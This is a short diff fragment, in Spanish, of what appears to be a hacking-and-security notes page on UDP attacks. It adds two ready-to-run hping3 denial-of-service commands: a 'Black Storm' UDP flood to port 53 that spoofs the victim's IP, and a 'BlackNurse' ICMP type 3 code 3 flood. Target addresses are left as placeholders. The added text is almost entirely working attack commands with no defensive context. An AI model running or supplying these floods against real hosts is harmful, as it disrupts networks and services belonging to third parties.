@@ -6,6 +6,13 @@ El atacante genera paquetes UDP con IP origen falsificada y envia a puertos UDP 
 
 
 
+Ataque Black Storm
+
+hping3 -2 --flood <ip> -p 53 --spoof  <ip_victima>
+ 
+Ataque ICMP BlackNurse 
+
+hping3 -1 -C 3 -K 3 --flood <ip>
 
 
 www.hackingyseguridad.com
